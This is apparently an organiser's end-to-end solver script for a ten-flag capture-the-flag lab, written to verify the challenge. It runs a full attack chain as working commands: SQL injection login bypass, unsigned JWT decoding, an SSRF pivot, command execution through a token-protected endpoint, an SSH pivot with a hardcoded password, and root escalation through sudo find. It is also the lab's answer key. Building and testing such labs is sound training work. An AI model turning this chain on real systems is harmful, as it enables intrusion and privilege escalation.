#!/usr/bin/env bash
# verify.sh — proves all 10 flags end-to-end against the freshly
# provisioned trio of VMs, the same way a player would: HTTP against
# portal's published port, JWT decode, SQLi, SSRF pivot to waystation,
# authenticated RCE, SSH pivot to vault, sudo privesc -- never via any
# build-only shortcut.
set -euo pipefail
cd "$(dirname "$0")/.."

WEB_PORT=8008
BASE="http://localhost:$WEB_PORT"
WAY_TOKEN="WAY-7a21-STATION"
VAULT_PASS="F3rrym4n-Vault!"
RELEASE_SECRET=$(cat ../organizer/release-secret.txt)

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import hmac, hashlib
d = hmac.new('$RELEASE_SECRET'.encode(), f'god-the-ferryman:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

WORK=$(mktemp -d)
JAR="$WORK/jar.txt"
trap 'rm -rf "$WORK"' EXIT

# Runs $1 as a shell command on vault (as traveler), via: portal's SSRF
# -> waystation's authenticated /run RCE -> SSH pivot to vault. Base64
# end to end so no layer of quoting collides with another.
remote_vault() {
    local b64 inner
    b64=$(printf '%s' "$1" | base64 -w0)
    inner="sshpass -p $VAULT_PASS ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null traveler@vault \"echo $b64 | base64 -d | bash\""
    # stdout/stderr land concatenated with no separator -- strip from
    # the literal "Warning:" onward, not by line anchor (see MANIFEST).
    curl -s -b "$JAR" --get --data-urlencode "url=http://waystation:7000/run?token=$WAY_TOKEN&cmd=$inner" "$BASE/admin/preview" \
        | sed 's/Warning: Permanently added.*//'
}

echo "== flag 1: page source =="
F1=$(curl -s "$BASE/" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 1 "$F1"

echo "== flag 2: JWT payload decode, no cracking =="
TOKEN=$(curl -s "$BASE/guest-token" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
F2=$(python3 -c "import jwt; print(jwt.decode('$TOKEN', options={'verify_signature': False})['note'])")
check 2 "$F2"

echo "== flag 3: SQL injection auth bypass =="
curl -s -c "$JAR" -d "username=' OR '1'='1' -- &password=x" "$BASE/login" -o /dev/null
F3=$(curl -s -b "$JAR" "$BASE/admin" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 3 "$F3"

echo "== flag 4: SSRF pivot to the never-published waystation =="
F4=$(curl -s -b "$JAR" --get --data-urlencode "url=http://waystation:7000/" "$BASE/admin/preview" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 4 "$F4"

echo "== flag 5: recover the waystation auth token (base64 + single-byte XOR) =="
CONFIG_B64=$(curl -s -b "$JAR" --get --data-urlencode "url=http://waystation:7000/config" "$BASE/admin/preview")
CONFIG_PLAIN=$(python3 -c "
import base64
print(bytes(b ^ 0x3C for b in base64.b64decode('''$CONFIG_B64''')).decode())
")
F5=$(echo "$CONFIG_PLAIN" | sed -n 's/note=//p')
check 5 "$F5"

echo "== flag 6: authenticated RCE on waystation -> vault creds + fragment A =="
WAY_OUT=$(curl -s -b "$JAR" --get --data-urlencode "url=http://waystation:7000/run?token=$WAY_TOKEN&cmd=cat+/opt/waystation/secret/flag6.txt" "$BASE/admin/preview")
F6=$(echo "$WAY_OUT" | sed -n '1p')
check 6 "$F6"
FRAG_A=$(echo "$WAY_OUT" | sed -n 's/.*fragment: //p')

echo "== flag 7: SSH pivot to vault, credentials recovered from flag 6 =="
F7=$(remote_vault 'cat flag7.txt' | tr -d '\n')
check 7 "$F7"

echo "== flag 8: sudo NOPASSWD misconfiguration -> root, + fragment B =="
OUT8=$(remote_vault 'sudo find /root/flag8.txt -exec cat {} \;')
F8=$(echo "$OUT8" | sed -n '1p')
check 8 "$F8"
FRAG_B=$(echo "$OUT8" | sed -n 's/.*fragment: //p')

echo "== flag 9: root-only forensic log, + fragment C =="
OUT9=$(remote_vault 'sudo find /root/ferryman_notes.log -exec cat {} \;')
F9=$(echo "$OUT9" | grep -oE 'HLC\{[a-f0-9]{10}\}' | tail -1)
check 9 "$F9"
FRAG_C=$(echo "$OUT9" | sed -n 's/.*Last fragment: \([a-f0-9]*\)".*/\1/p')

echo "== flag 10: combine all three fragments to decrypt the final dossier =="
B64_DOSSIER=$(remote_vault 'sudo find /root/dossier.enc -exec base64 -w0 {} \;' | tr -d '\n')
echo "$B64_DOSSIER" | base64 -d > "$WORK/dossier.enc"
F10=$(python3 -c "
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

MAGIC = b'HLCX1'
with open('$WORK/dossier.enc', 'rb') as f:
    blob = f.read()
rest = blob[len(MAGIC):]
salt, nonce, ct = rest[:16], rest[16:28], rest[28:]
key = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1).derive('${FRAG_A}${FRAG_B}${FRAG_C}'.encode())
print(AESGCM(key).decrypt(nonce, ct, None).decode())
")
check 10 "$F10"

echo
echo "All 10 flags verified end-to-end."
